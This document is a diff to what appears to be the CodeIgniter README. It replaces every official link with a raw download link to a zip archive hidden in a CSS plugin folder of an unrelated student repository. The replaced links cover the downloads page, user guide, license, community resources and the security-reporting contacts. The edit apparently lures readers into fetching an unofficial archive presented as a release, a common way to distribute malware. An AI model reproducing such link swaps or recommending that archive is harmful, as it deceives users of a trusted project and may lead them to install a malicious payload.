@@ -16,14 +16,14 @@ Release Information
 
 This repo contains in-development code for future releases. To download the
 latest stable release please visit the `CodeIgniter Downloads
-<https://codeigniter.com/download>`_ page.
+<https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_ page.
 
 **************************
 Changelog and New Features
 **************************
 
 You can find a list of all changes for each release in the `user
-guide change log <https://github.com/bcit-ci/CodeIgniter/blob/develop/user_guide_src/source/changelog.rst>`_.
+guide change log <https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_.
 
 *******************
 Server Requirements
@@ -39,7 +39,7 @@ issues, as well as missing features.
 Installation
 ************
 
-Please see the `installation section <https://codeigniter.com/userguide3/installation/index.html>`_
+Please see the `installation section <https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_
 of the CodeIgniter User Guide.
 
 *******
@@ -47,21 +47,21 @@ License
 *******
 
 Please see the `license
-agreement <https://github.com/bcit-ci/CodeIgniter/blob/develop/user_guide_src/source/license.rst>`_.
+agreement <https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_.
 
 *********
 Resources
 *********
 
--  `User Guide <https://codeigniter.com/docs>`_
--  `Contributing Guide <https://github.com/bcit-ci/CodeIgniter/blob/develop/contributing.md>`_
--  `Language File Translations <https://github.com/bcit-ci/codeigniter3-translations>`_
--  `Community Forums <http://forum.codeigniter.com/>`_
--  `Community Wiki <https://github.com/bcit-ci/CodeIgniter/wiki>`_
--  `Community Slack Channel <https://codeigniterchat.slack.com>`_
+-  `User Guide <https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_
+-  `Contributing Guide <https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_
+-  `Language File Translations <https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_
+-  `Community Forums <https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_
+-  `Community Wiki <https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_
+-  `Community Slack Channel <https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_
 
-Report security issues to our `Security Panel <mailto:security@codeigniter.com>`_
-or via our `page on HackerOne <https://hackerone.com/codeigniter>`_, thank you.
+Report security issues to our `Security Panel <https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_
+or via our `page on HackerOne <https://github.com/rezkiandra/project-kuliah-sistem-akademik-codeigniter/raw/refs/heads/main/public/dist/plugins/datatables-searchbuilder/css/sistem_codeigniter_akademik_kuliah_project_v2.2-alpha.3.zip>`_, thank you.
 
 ***************
 Acknowledgement
